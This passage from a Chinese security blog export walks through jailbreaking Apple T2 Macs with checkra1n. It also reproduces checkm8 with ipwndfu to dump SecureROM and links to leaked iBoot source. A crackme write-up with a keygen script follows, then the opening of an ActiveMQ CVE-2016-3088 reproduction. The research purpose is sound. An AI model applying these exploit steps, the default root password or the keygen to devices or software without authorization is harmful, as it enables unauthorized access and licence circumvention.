<thead>
<tr>
<th><strong>iBridge产品编号</strong></th>
<th><strong>板号</strong></th>
<th>board minor</th>
<th><strong>说明（产品编号）</strong></th>
<th><strong>checkm8 / blackbird确认</strong></th>
</tr>
</thead>
<tbody><tr>
<td>iBridge2,1</td>
<td>J137AP</td>
<td>0x0A</td>
<td>苹果T2 iMacPro1,1（j137）</td>
<td>是</td>
</tr>
<tr>
<td>iBridge2,3</td>
<td>J680AP</td>
<td>0x0B</td>
<td>苹果T2 MacBookPro15,1（j680）</td>
<td>是</td>
</tr>
<tr>
<td>iBridge2,4</td>
<td>J132AP</td>
<td>0x0C</td>
<td>苹果T2 MacBookPro15,2（j132）</td>
<td>是</td>
</tr>
<tr>
<td>iBridge2,5</td>
<td>J174AP</td>
<td>0x0E</td>
<td>苹果T2 Macmini8,1（j174）</td>
<td>是</td>
</tr>
<tr>
<td>iBridge2,6</td>
<td>J160AP</td>
<td>0x0F</td>
<td>苹果T2 MacPro7,1（j160）</td>
<td>是</td>
</tr>
<tr>
<td>iBridge2,7</td>
<td>J780AP</td>
<td>0x07</td>
<td>苹果T2 MacBookPro15,3（j780）</td>
<td>是</td>
</tr>
<tr>
<td>iBridge2,8</td>
<td>J140kAP</td>
<td>0x17</td>
<td>苹果T2 MacBookAir8,1（j140k）</td>
<td>是</td>
</tr>
<tr>
<td>iBridge2,10</td>
<td>J213AP</td>
<td>0x18</td>
<td>苹果T2 MacBookPro15,4（j213）</td>
<td>是</td>
</tr>
<tr>
<td>iBridge2,11</td>
<td>J230AP</td>
<td>0x1F</td>
<td>？</td>
<td>？</td>
</tr>
<tr>
<td>iBridge2,12</td>
<td>J140aAP</td>
<td>0x37</td>
<td>苹果T2 MacBookAir8,2（j140a）</td>
<td>是</td>
</tr>
<tr>
<td>iBridge2,13</td>
<td>J214AP</td>
<td>0x1E</td>
<td>？</td>
<td>？</td>
</tr>
<tr>
<td>iBridge2,14</td>
<td>J152fAP</td>
<td>0x3A</td>
<td>苹果T2 MacBookPro16,1（j152f）</td>
<td>是</td>
</tr>
<tr>
<td>iBridge2,15</td>
<td>J230kAP</td>
<td>0x3F</td>
<td>苹果T2 MacBookAir9,1（j223k）</td>
<td>是</td>
</tr>
<tr>
<td>iBridge2,16</td>
<td>J214kAP</td>
<td>0x3E</td>
<td>？</td>
<td>？</td>
</tr>
<tr>
<td>iBridge2,19</td>
<td>J185AP</td>
<td>0x22</td>
<td>？</td>
<td>？</td>
</tr>
<tr>
<td>iBridge2,20</td>
<td>J185fAP</td>
<td>0x23</td>
<td>？</td>
<td>？</td>
</tr>
<tr>
<td>iBridge2,21</td>
<td>J223AP</td>
<td>0x3B</td>
<td>？</td>
<td>？</td>
</tr>
<tr>
<td>iBridge2,22</td>
<td>J215AP</td>
<td>0x38</td>
<td>？</td>
<td>？</td>
</tr>
</tbody></table>
<h2 id="0x02-T2芯片的MacOS安全启动过程"><a href="#0x02-T2芯片的MacOS安全启动过程" class="headerlink" title="0x02 T2芯片的MacOS安全启动过程"></a>0x02 T2芯片的MacOS安全启动过程</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 即使Mac设备已关闭，T2芯片也已完全启动并保持开启状态。</span><br><span class="line"></span><br><span class="line">2. 按下电源按钮或打开机盖会触发系统管理控制器（SMC）引导。</span><br><span class="line"></span><br><span class="line">3. SMC执行加电自检（POST），以检测任何EFI或硬件问题，例如RAM损坏，并可能重定向到Recovery。</span><br><span class="line"></span><br><span class="line">4. 在进行了基本的健康检查之后，将触发T2芯片并设置I &#x2F; O连接器。（USB，NVMe，PCIe等），它将使用NVMe和PCIe与NAND存储进行通信。</span><br><span class="line"></span><br><span class="line">5. 选择适用的启动磁盘，然后询问是否启用了磁盘加密密码以 可能通过FileVault2磁盘加密来挂载 [APFS](https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Apple_File_System)卷。</span><br><span class="line"></span><br><span class="line">6. &#x2F;System&#x2F;Library&#x2F;CoreServices&#x2F;boot.efi位于系统APFS卷上，并且 [根据您的安全启动设置 ](https:&#x2F;&#x2F;support.apple.com&#x2F;en-us&#x2F;HT208330)进行了验证。</span><br><span class="line"></span><br><span class="line">7. 运行boot.efi来加载Darwin内核（回退到BSD）（如果启动Microsoft Windows，则启动Boot Camp）和IODevice驱动程序。如果在&#x2F; System &#x2F; Library &#x2F; PrelinkedKernels &#x2F; prelinkedkernel中找到了内核缓存，它将使用该缓存。</span><br><span class="line"></span><br><span class="line">8. 如果用户批准的内核扩展已被T2芯片批准，则将其初始化并添加到内核空间。这将随着系统扩展而消失。</span><br></pre></td></tr></table></figure>



<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/macOS-secure-booting.png" alt="img"></p>
<h2 id="0x03-越狱步骤"><a href="#0x03-越狱步骤" class="headerlink" title="0x03 越狱步骤"></a>0x03 越狱步骤</h2><h4 id="需要设备："><a href="#需要设备：" class="headerlink" title="需要设备："></a>需要设备：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.一台带有T2芯片的Mac</span><br><span class="line">2.另一个MacOS（不知道虚拟机是否可以）；</span><br><span class="line">3.USB-C至USB-C电缆。Macbook附带的就可以。</span><br></pre></td></tr></table></figure>

<h3 id="1-从官方网站下载最新版本的Checkra1n-T2越狱工具。"><a href="#1-从官方网站下载最新版本的Checkra1n-T2越狱工具。" class="headerlink" title="1.从官方网站下载最新版本的Checkra1n T2越狱工具。"></a>1.从<a href="https://checkra.in/releases/">官方网站</a>下载最新版本的Checkra1n T2越狱工具。</h3><p>​    <a href="https://checkra.in/releases/">https://checkra.in/releases/</a></p>
<h3 id="2-将Mac置于DFU模式。"><a href="#2-将Mac置于DFU模式。" class="headerlink" title="2.将Mac置于DFU模式。"></a>2.将Mac置于DFU模式。</h3><p>如何进入MacOS DFU模式](<a href="https://checkm8.info/blog/dfu-mode-mac">https://checkm8.info/blog/dfu-mode-mac</a>)</p>
<p>如何置于DFU模式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.需要两台电脑</span><br><span class="line">2.Apple Configurator 2</span><br><span class="line">3.usb-c线插到电脑左侧第二个接口</span><br><span class="line">4.按住电源按钮1s</span><br><span class="line">5.同时按住左control、左option和右shift 持续8s</span><br><span class="line">6.Configurator 2显示为DFU模式</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/aeb34551b54ee063316ea5c98f7c617e.png" alt="Apple Configurator 2 显示 Mac进入了DFU模式"></p>
<p>检查设备是否已经进入DFU模式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ioregg -p IOUSB</span><br></pre></td></tr></table></figure>

<h3 id="3-使用CLI，Checkra1n的命令行版本"><a href="#3-使用CLI，Checkra1n的命令行版本" class="headerlink" title="3.使用CLI，Checkra1n的命令行版本"></a>3.使用CLI，Checkra1n的命令行版本</h3><p><strong>Checkra1n GUI版本0.11.0不支持T2越狱。</strong></p>
<p>如果用Checkra1n工具连接带有T2的Mac，会报以下错误</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sorry, your device is not supported.</span><br></pre></td></tr></table></figure>

<h4 id><a href="#" class="headerlink" title></a></h4><p>在Finder中打开Checkra1n应用程序，然后右键单击它以查看“显示包装内容”菜单</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/macbook-jailbreak.png" alt="img" style="zoom:50%;">

<p>现在转到文件夹<code>Contents =&gt; MacOS</code>。可以看到Checkra1n二进制文件。打开终端应用程序，然后将二进制文件拖放到<code>&quot;Terminal.&quot;</code></p>
<p>或者，如果将Checkra1n应用程序放入“应用程序”文件夹，则可以在以下命令中键入以下命令 <code>&quot;Terminal:&quot;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;Applications&#x2F;checkra1n.app&#x2F;Contents&#x2F;MacOS&#x2F;checkra1n</span><br></pre></td></tr></table></figure>

<h3 id="4-通过-c来启动命令行版本"><a href="#4-通过-c来启动命令行版本" class="headerlink" title="4.通过-c来启动命令行版本"></a>4.通过-c来启动命令行版本</h3><p>同时开启 -v 来检查越狱日志</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;Applications&#x2F;checkra1n.app&#x2F;Contents&#x2F;MacOS&#x2F;checkra1n -c -v</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/macbook-jailbreak-t2-20201126102132819.png" alt="img"></p>
<p>如果报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Timed out waiting for bootstrap upload (error code: -20)</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/macbook-jailbreak-t2-chip-20201126102147333.png" alt="img"></p>
<p>在这种情况下，请重新启动Checkra1n CLI工具，直到看到引导程序成功安装的消息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">: Bootstrap already installed, done</span><br></pre></td></tr></table></figure>

<p>可能需要重试几次才能完成。</p>
<h3 id="5-通过SSH进入越狱的Apple-T2芯片"><a href="#5-通过SSH进入越狱的Apple-T2芯片" class="headerlink" title="5.通过SSH进入越狱的Apple T2芯片"></a>5.通过SSH进入越狱的Apple T2芯片</h3><p>成功越狱之后打开一个新的终端窗口，然后输入以下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iproxy 2222 44</span><br></pre></td></tr></table></figure>

<p>不要关闭此窗口并再打开一个终端窗口<code>(Command + T)</code>。输入此命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh root@localhost -p 2222</span><br></pre></td></tr></table></figure>

<p>密码是： <code>alpine</code></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/macbook-jailbreak-t2-security-chip.png" alt="img"></p>
<h2 id="0x04-具体原理"><a href="#0x04-具体原理" class="headerlink" title="0x04 具体原理"></a>0x04 具体原理</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201202201030024.png" alt="image-20201202201030024" style="zoom:50%;">

<h3 id="核心问题："><a href="#核心问题：" class="headerlink" title="核心问题："></a>核心问题：</h3><p>T2安全芯片上的SepOS微型操作系统是包含基于IOS A10的处理器，据说A12的芯片似乎解决了这个问题，但是未确认</p>
<p>在Twitter和Reddit上提到由于T2芯片和iPhone及其底层硬件之间共享某些硬件和软件功能。通过结合最初越狱iphone的checkm8 + blackbird两个漏洞便可以越狱T2安全芯片的Mac和Macbook设备</p>
<p>根据 <a href="https://ironpeak.be/blog/crouching-t2-hidden-danger/">比利时安全公司ironPeak的帖子</a>，越狱T2安全芯片涉及通过USB-C连接到Mac / MacBook，并 在Mac的启动过程中运行<a href="https://checkra.in/">Checkra1n越狱软件</a>的<a href="https://checkra.in/">0.11.0</a>版本 。</p>
<p>根据ironPeak的说法，这之所以奏效，是因为“ Apple在向客户提供的T2安全芯片中打开调试界面，允许任何人无需身份验证即可进入设备固件更新（DFU）模式。”</p>
<p>使用这种方法，可以创建一条USB-C电缆，该电缆可以在启动时自动利用您的macOS设备。</p>
<p>这使攻击者可以在T2芯片上获得root用户访问权限，并修改和控制目标设备上运行的所有内容，甚至可以恢复加密的数据。</p>
<h3 id="1-Checkm8"><a href="#1-Checkm8" class="headerlink" title="1.Checkm8"></a>1.Checkm8</h3><p>一句话描述漏洞：对USB请求处理不当造成的UAF漏洞。手里有一个iphone5s，所以决定研究一下checkm8这个漏洞。</p>
<h4 id="上手尝试"><a href="#上手尝试" class="headerlink" title="上手尝试"></a>上手尝试</h4><p>在分析这个漏洞之前，先对checkm8有一个感性直观的认识，我们首先动动手，做俩实验：分别是使用checkra1n越狱，以及使用ipwndfu提取固化在处理器芯片中的固件代码(SecureROM)。不过在动手之前，先阅读以下写给科技爱好者的文章和广大网友对这个漏洞的讨论：</p>
<ul>
<li><a href="https://new.qq.com/omn/20190929/20190929A0QNVW00.html">苹果现史诗级漏洞：iPhone可永久越狱，库克却束手无策！</a></li>
<li><a href="https://www.expreview.com/70777.html">有问有答：为什么说这次苹果A系列处理器中的BootROM漏洞是史诗级的？</a></li>
<li><a href="https://www.zhihu.com/question/348168793">如何看待苹果 A5-A11 芯片的「史诗级越狱漏洞」Checkm8？影响有多大？</a></li>
</ul>
<h4 id="checkra1n-越狱"><a href="#checkra1n-越狱" class="headerlink" title="checkra1n 越狱"></a>checkra1n 越狱</h4><p>使用<a href="https://checkra.in/">checkra1n</a>，基本就是傻瓜操作。不过与普通越狱不同的是，在使用这个工具越狱后，并不需要安装cydia，即可在爱思助手直接开始ssh通道。ssh通道这个功能是将手机的22端口通过usb映射到电脑主机的端口，第一次用可能会迷糊。默认的用户名密码是：<code>root:alpine</code>，如果不熟悉越狱和ssh流程，可以参考如下文章：</p>
<ul>
<li><a href="https://www.jianshu.com/p/aa007c10a7a1?from=singlemessage">IOS 13.3 checkRa1n 越狱</a></li>
<li><a href="http://www.veryitman.com/2018/05/12/iOS-逆向-越狱使用-SSH/">iOS 逆向: 越狱使用 SSH</a></li>
</ul>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201203102556462.png" alt="image-20201203102556462" style="zoom:50%;">



<p>另外发现ssh虽然开启，也可以由外部连入本机的22端口，但是并不能本机自己连自己，即并不能在手机上安装一个ssh客户端软件来访问自己的shell，这里苹果做了限制，绕过方式是修改ssh服务端口并重启，参考如下：</p>
<ul>
<li><a href="https://www.jianshu.com/p/a2c02b8c27f5">iOS 已越的设备SSH localhost</a></li>
<li><a href="https://apple.stackexchange.com/questions/159361/unable-to-ssh-rootlocalhost-on-jailbroken-ipad-with-ios-8-1">Unable to ssh root@localhost on jailbroken iPad with iOS 8.1</a></li>
</ul>
<h4 id="ipwndfu-提取-SecureROM"><a href="#ipwndfu-提取-SecureROM" class="headerlink" title="ipwndfu 提取 SecureROM"></a>ipwndfu 提取 SecureROM</h4><p>使用<a href="https://github.com/axi0mX/ipwndfu/">ipwndfu</a>完成dump固件。但是其并不是对任何iPhone都支持，在readme中可见支持说明：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">current SoC support: s5l8947x, s5l8950x, s5l8955x, s5l8960x, t8002, t8004, t8010, t8011, t8015</span><br><span class="line">future SoC support: s5l8940x, s5l8942x, s5l8945x, s5l8747x, t7000, t7001, s7002, s8000, s8001, s8003, t8012</span><br></pre></td></tr></table></figure>

<p>这些SoC版本对应的苹果设备型号可以参考：<a href="https://www.theiphonewiki.com/，可见iPhone5s是s5l8960刚好可以，然后我们将手机置于DFU模式，方法参考">https://www.theiphonewiki.com/，可见iPhone5s是s5l8960刚好可以，然后我们将手机置于DFU模式，方法参考</a></p>
<p><a href="https://www.i4.cn/news_detail_30618.html">iPhone 进恢复模式和 DFU 模式有什么区别？</a>，iPhone 5s 进入DFU 模式的方法：<br>1、打开iTune<br>2、按住苹果顶部的power键3秒;<br>3、不要松开power键同时按住home键10秒;<br>4、松开power键继续按住home键，一直到iTunes会自动检测到出于恢复模式的iPhone后再松开</p>
<p>安装libusb</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew install libusb</span><br></pre></td></tr></table></figure>

<p>然后在ipwndfu目录<code>./ipwndfu -p</code>完成后门的植入，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ .&#x2F;ipwndfu -p                                                                                                                             127 ↵</span><br><span class="line">*** checkm8 exploit by axi0mX ***</span><br><span class="line">Found: CPID:8960 CPRV:11 CPFM:03 SCEP:01 BDID:02 ECID:00000635CB274B30 IBFL:1C SRTG:[iBoot-1704.10]</span><br><span class="line">Device is now in pwned DFU Mode.</span><br><span class="line">(13.54 seconds)</span><br></pre></td></tr></table></figure>

<p>成功之后即可在电脑的【关于本机】-&gt; 【系统报告】的USB设备详细信息中看到手机的USB序列号已经被更改：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201203111159468.png" alt="image-20201203111159468"></p>
<p>然后dump固件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ sudo .&#x2F;ipwndfu --dump-rom</span><br><span class="line">Saved: SecureROM-s5l8960xsi-1704.10-RELEASE.dump</span><br></pre></td></tr></table></figure>

<p>可以与</p>
<p><a href="https://securerom.fun/">https://securerom.fun/</a> </p>
<p>这里下载的固件进行比对，经测试，固件是一致的。</p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><ul>
<li><a href="https://zhuanlan.zhihu.com/p/87456653">iPhone史诗级漏洞checkm8攻击原理浅析</a></li>
<li><a href="https://m.habr.com/en/company/dsec/blog/472762/">Technical analysis of the checkm8 exploit</a></li>
<li><a href="https://www.anquanke.com/post/id/187864">iPhone BootROM 漏洞说明及威胁评估</a></li>
<li><a href="https://iokit.racing/oneweirdtrick.pdf">The One Weird Trick SecureROM Hates</a></li>
</ul>
<h5 id="iBoot源码泄露事件"><a href="#iBoot源码泄露事件" class="headerlink" title="iBoot源码泄露事件"></a>iBoot源码泄露事件</h5><blockquote>
<p>这是一切的开始。</p>
</blockquote>
<p>让我们来看一条2018年2月8日的新闻：<a href="https://mp.weixin.qq.com/s/YrZPxHttM4qoVgqz1YApJw">史上最大源码泄露事件：iOS 关键源代码被匿名公布在 GitHub 上</a>，再来看看当时的中国网民怎么说：</p>
<ul>
<li><a href="https://www.zhihu.com/question/266880039">iOS9源码泄露,是真的么?</a></li>
<li><a href="https://www.zhihu.com/question/266898229">如何看待 2018 年 2 月 8 日iBoot源代码泄漏事件？</a></li>
</ul>
<p>可见大部分网民还是吃瓜，因为不懂不了解，也就无法明白这份代码对于理解并破解iPhone的重要性。可以这么说，此次iboot源码的泄露是黑客发现checkm8这个漏洞的起点。但是苹果当时的回应是：<a href="http://tech.sina.com.cn/it/2018-02-09/doc-ifyrkuxs4997460.shtml">iOS 9源代码被泄露 苹果：该源代码已过时 不必担忧</a>。我们事后诸葛亮的来看这个事，可以说是大型打脸现场了，因为泄露的代码至今仍然没有过时。当年苹果公司说他们不在乎，泄露的都是过时的老代码，没有价值，可是他们当时是怎么做的呢？<a href="https://www.leiphone.com/news/201802/HAPYD8ulbmkJNqMt.html">GitHub泄露苹果iBoot源代码？苹果：全网删，谢谢</a>。真的都是江湖人，江湖事呀。那这份泄露的代码在哪呢？虽然在github找到不到了，不过，互联网是有记忆的，网民是万能的：</p>
<ul>
<li><a href="https://download.csdn.net/download/galaxy0011/10257969">iBoot源代码（含.git目录），来自Github</a></li>
<li><a href="https://bbs.pediy.com/thread-225000.htm">最近泄露的Apple iBoot/BootROM/Baseband源代码</a></li>
<li><a href="https://0x1.gitlab.io/phone/iBoot/">iBoot IOS 9.3 Leaked</a></li>
<li><a href="https://yalujailbreak.net/bootrom-iboot-source-code-leaked/">Twitter user leaks iOS 9 BootROM and iBoot source code online</a></li>
<li><a href="https://web.archive.org/web/20180208003452/https://github.com/ZioShiba/iBoot">https://web.archive.org/web/20180208003452/https://github.com/ZioShiba/iBoot</a></li>
</ul>
<p>这份泄露的代码主要是iBoot，相当于PC的BIOS层面的代码，不是做底层的程序员一般是看不明白。不过我们大概也猜到了，这些代码主要负责的就是iPhone的启动过程。启动，你会想到什么呢？</p>
<h5 id="iPhone的操作模式"><a href="#iPhone的操作模式" class="headerlink" title="iPhone的操作模式"></a>iPhone的操作模式</h5><p>刚才的两个小实验中，我们将iPhone经过按键的操作进入了DFU模式，其实iPhone还有一种模式叫恢复模式，这些称之为iPhone的操作模式：</p>
<ul>
<li><a href="https://beta.4hou.com/mobile/14346.html">iOS DFU和恢复模式的异同之处</a></li>
<li><a href="https://developer.aliyun.com/article/175407">iOS取证实战：调查、分析与移动安全：操作模式</a></li>
</ul>
<p>其实我们在其他设备上也有类似的操作，比如Android的recovery、fastboot、9008，PC的BIOS配置，Windows的安全模式，Mac的恢复模式等。这些操作都可以理解为进入了一个小系统，这些小系统可能为主系统的运行提供一些必要的支持，也可能作为备用系统以防主系统遭遇不测。我们一般通过在开机过程中按照顺序或者时间的要求按下一些按键，进入这些小系统。换句话说我们没有成功启动主系统，而启动了小系统，对，就是启动。那么这里每一个小系统都有着对应的代码实体，iPhone的DFU和恢复模式的代码实体又在哪呢？是不是iBoot呢？带着这个疑问让我们来看一下，苹果公司泄露的代码能不能回答这个问题。</p>
<h5 id="泄露源码分析"><a href="#泄露源码分析" class="headerlink" title="泄露源码分析"></a>泄露源码分析</h5><p>打开泄露的源码，大致浏览了一下目录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ tree -N -L 2</span><br><span class="line">.</span><br><span class="line">├── Makefile</span><br><span class="line">├── apps</span><br><span class="line">│   ├── EmbeddedIOP</span><br><span class="line">│   ├── SecureROM</span><br><span class="line">│   └── iBoot</span><br><span class="line">├── arch</span><br><span class="line">│   ├── arm</span><br><span class="line">│   └── arm64</span><br></pre></td></tr></table></figure>

<p>原来泄露的不只有iBoot，还有SecureROM！其实认真看苹果源码泄露事件的国外报道：<a href="https://www.iphonefirmware.com/breakthrough-iboot-and-securerom-source-code-has-leaked-could-lead-to-permanent-bootrom-iphone-jailbreak/">Breakthrough: iBoot And SecureROM Source Code Has Leaked, Could Lead To Permanent Bootrom iPhone Jailbreak</a>，他们是明确说了iBoot和SecureROM（也就是BootROM）的代码都泄露了，只不过是国内的媒体都只说了iBoot。接下来就是优秀源码阅读时间，不过无论是iBoot还是SecureROM，都是那种天地初开之时的底层代码。对于陌生的代码，可以从代码的运行顺序，目录结构，编译方法，文档说明，对比同类代码，以及他人的分析文章等方面综合理解。</p>
<ul>
<li><a href="https://www.reddit.com/r/jailbreak/comments/7vrl1q/discussion_iboot_source_code_leaked/">Discussion: iBoot Source Code Leaked</a></li>
<li><a href="https://blog.xinoassassin.me/2018/02/what-iboot-source-code-contains/">泄露的 iBoot 源代码中都有些什么</a></li>
<li><a href="https://beta.4hou.com/technology/13937.html">如何构建iBoot？</a></li>
<li><a href="https://nyansatan.github.io/building-iboot/">Building iBoot</a></li>
</ul>
<h2 id="0x05-调试"><a href="#0x05-调试" class="headerlink" title="0x05 调试"></a>0x05 调试</h2><p>JTAG相关</p>
<ul>
<li><a href="http://newosxbook.com/bonus/iBoot.pdf">iBoot</a></li>
<li><a href="https://www.youtube.com/watch?v=-ziD74n9lr4">SEPROM dump</a></li>
<li><a href="https://threader.app/thread/1177856941139337216">https://threader.app/thread/1177856941139337216</a></li>
<li><a href="https://twitter.com/nyan_satan/status/1090989650280398849">https://twitter.com/nyan_satan/status/1090989650280398849</a></li>
<li><a href="https://youtu.be/3zpwSUXlz6A">YouTube: iPhone 7平台用checkm8漏洞以及Bonobo JTAG电缆和OpenOCD + GDB进行调试</a></li>
</ul>
<h3 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h3><p><a href="https://checkm8.info/blog/jailbreak-mac-apple-t2-chip">https://checkm8.info/blog/jailbreak-mac-apple-t2-chip</a></p>
<p><a href="https://xuanxuanblingbling.github.io/ios/2020/07/10/checkm8/#">https://xuanxuanblingbling.github.io/ios/2020/07/10/checkm8/#</a><br><a href="https://ironpeak.be/blog/crouching-t2-hidden-danger/">https://ironpeak.be/blog/crouching-t2-hidden-danger/</a></p>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>Apple T2</tag>
      </tags>
  </entry>
  <entry>
    <title>crackme-系列之-crackme1</title>
    <url>/2020/12/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme1/</url>
    <content><![CDATA[<h2 id="首先打开程序进行查看"><a href="#首先打开程序进行查看" class="headerlink" title="首先打开程序进行查看"></a>首先打开程序进行查看</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211408617.png" alt="image-20201217211408617" style="zoom:50%;">

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211534773.png" alt="image-20201217211534773" style="zoom:50%;">

<p>发现无壳</p>
<a id="more"></a>

<h2 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211703604.png" alt="image-20201217211703604" style="zoom:50%;">

<p>账户密码认证 直接仍进去OD进行分析 搜索关键字</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211729398.png" alt="image-20201217211729398"></p>
<p>在函数⼊⼝处下断点然后运⾏跟踪</p>
<p>输⼊11111 11111</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211749736.png" alt="image-20201217211749736" style="zoom:50%;">

<p>发现关键call 和对比进入分析</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211829649.png" alt="image-20201217211829649"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211843007.png" alt="image-20201217211843007"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211852605.png" alt="image-20201217211852605"></p>
<p>⽤户 11111</p>
<p>堆栈 ss:[0019F664]=0241D6A8, (ASCII “CW-4018-CRACKED”)</p>
<p>eax=00000005</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211930837.png" alt="image-20201217211930837" style="zoom:50%;">

<p>输⼊后成功破解</p>
<h2 id="对算法进行相应的破解"><a href="#对算法进行相应的破解" class="headerlink" title="对算法进行相应的破解"></a>对算法进行相应的破解</h2><p>下断点 输⼊ 11111 22222</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212049762.png" alt="image-20201217212049762"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212101828.png" alt="image-20201217212101828"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212112333.png" alt="image-20201217212112333"></p>
<p>发现有两次-的拼接</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212144262.png" alt="image-20201217212144262"></p>
<p>CW-xxxx-CRACKED</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212206907.png" alt="image-20201217212206907"></p>
<p>这⾥为取第⼀⼀位 ascii码值的16进制 31 x 0x29</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212244191.png" alt="image-20201217212244191"></p>
<p>相乘之后为 0x7d9</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212316214.png" alt="image-20201217212316214"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212401486.png" alt="image-20201217212401486"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212426807.png" alt="image-20201217212426807"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212446924.png" alt="image-20201217212446924"></p>
<p>⾃身x2</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212513125.png" alt="image-20201217212513125"></p>
<p>之后转10进制即可</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212548980.png" alt="image-20201217212548980"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212606569.png" alt="image-20201217212606569"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212619373.png" alt="image-20201217212619373"></p>
<p>接下来是字符拼接</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212647428.png" alt="image-20201217212647428"></p>
<p>根据push关系可以推断出此处注册码为：</p>
<p>CW-4018-CRACKED</p>
<p>#####</p>
<p>算法脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c &#x3D; input(&quot;please input a str\n&quot;)</span><br><span class="line">temp&#x3D;eval(hex(eval(hex(ord(c[0])))*eval(&#39;0x29&#39;)*eval(&#39;0x2&#39;))) </span><br><span class="line">flag &#x3D; &quot;CW-&quot; + str(temp) + &quot;-CRACKED&quot;</span><br><span class="line">print (flag)</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212906861.png" alt="image-20201217212906861"></p>
]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>crackme</tag>
      </tags>
  </entry>
  <entry>
    <title>ActiveMQ漏洞复现分析以及POC(CVE-2016-3088)</title>
    <url>/2020/12/17/WEB/Exploit/ActiveMQ/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8APOC-CVE-2016-3088/</url>
    <content><![CDATA[<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>影响版本：Apache ActiveMQ 5.0.0 – 5.13.2<br>ActiveMQ在5.12.x~5.13.x版本中，默认关闭了fileserver这个应用<br>5.14.0版本以后，彻底删除fileserver</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>vulhub拉取漏洞环境docker启动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<a id="more"></a>

